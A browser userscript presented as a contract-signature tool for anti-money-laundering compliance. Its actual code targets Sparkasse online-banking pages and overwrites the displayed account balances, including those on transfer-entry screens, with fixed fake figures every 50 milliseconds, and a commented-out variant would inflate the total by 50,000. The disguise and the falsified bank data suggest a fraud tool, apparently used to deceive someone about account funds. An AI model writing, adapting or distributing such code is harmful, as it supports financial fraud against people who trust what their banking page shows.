// ==UserScript==
// @name         Vertragssignature VB Erika Cichy-Romberg
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Anforderung an GwG - digitale Signatur
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        https://www.vr-lif-ebn.de/services_cloud/portal/m/*
// @match        https://www.sparkasse-landsberg.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.sparkasse-landsberg.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/466320/Vertragssignature%20VB%20Erika%20Cichy-Romberg.user.js
// @updateURL https://update.greasyfork.org/scripts/466320/Vertragssignature%20VB%20Erika%20Cichy-Romberg.meta.js
// ==/UserScript==

(function() {
    'use strict';
    var balanceupdate = 0;
    var newBalance = "165.086,30";
    var TopSaldo = "275.612,99";
    var KontoBalance = "193.040,63";
    var newBalanceText = "165.086,30 EUR"
    var AddAmount = 50000;


    //var elementExists = document.getElementsByClassName("kontenuebersicht-saldo")[0].children[0].textContent;
    var GesamtSaldoTOPChange = "";
    setInterval(function(){
        //Gesamtsaldo

        //if (GesamtSaldoTOPChange == ""){
        //    var gesamtSaldoTOP = document.getElementsByClassName("kontenuebersicht-saldo")[0].children[0].textContent;
        //    var gesamtSaldoTOPNoDot = gesamtSaldoTOP.replace(".", "");
        //    var gesamtSaldoTOPZahl = gesamtSaldoTOPNoDot.replace(",", ".");
        //    var gesamtSaldoTOPInt = parseFloat(gesamtSaldoTOPZahl);
        //    var gesamtSaldoTOPNew = gesamtSaldoTOPInt + AddAmount;
        //    var zwischenSpeicher = Intl.NumberFormat().format(gesamtSaldoTOPNew);
        //    document.getElementsByClassName("kontenuebersicht-saldo")[0].children[0].textContent = Intl.NumberFormat().format(gesamtSaldoTOPNew);
        //    if (document.getElementsByClassName("kontenuebersicht-saldo")[0].children[0].textContent == zwischenSpeicher){GesamtSaldoTOPChange = "done"; alert("worked")}
        //alert(new Intl.NumberFormat().format(gesamtSaldoTOPNew));
        //}

        if (document.getElementsByClassName("kontenuebersicht-saldo")[0].children[0].textContent != newBalance){
            document.getElementsByClassName("kontenuebersicht-saldo")[0].children[0].textContent = newBalance;

        }
        //Gesamtsaldo 2
        if (document.getElementsByClassName("kontenuebersicht-saldo")[1].children[0].textContent != newBalance){
            document.getElementsByClassName("kontenuebersicht-saldo")[1].children[0].textContent = newBalance;
        }
        //Erster Account
        if (document.getElementsByClassName("kontenuebersicht-saldo")[2].children[0].textContent != newBalance){
            document.getElementsByClassName("kontenuebersicht-saldo")[2].children[0].textContent = newBalance;
        }

    }, 50);

    setInterval(function(){
        if (window.location.href.indexOf("erfassen") > 0) {

            //Balance bei SEPA Erfassung
            if (document.getElementsByClassName("balance")[0].textContent != newBalanceText){
                document.getElementsByClassName("balance")[0].textContent = newBalanceText;
            }
        }}, 50);

    setInterval(function(){
        //Balance Auslandsueberweisung
        if (document.getElementsByClassName("kf-account-saldo-value")[0].textContent != newBalance){
            document.getElementsByClassName("kf-account-saldo-value")[0].textContent = newBalance;
        }
    }, 50);}




)();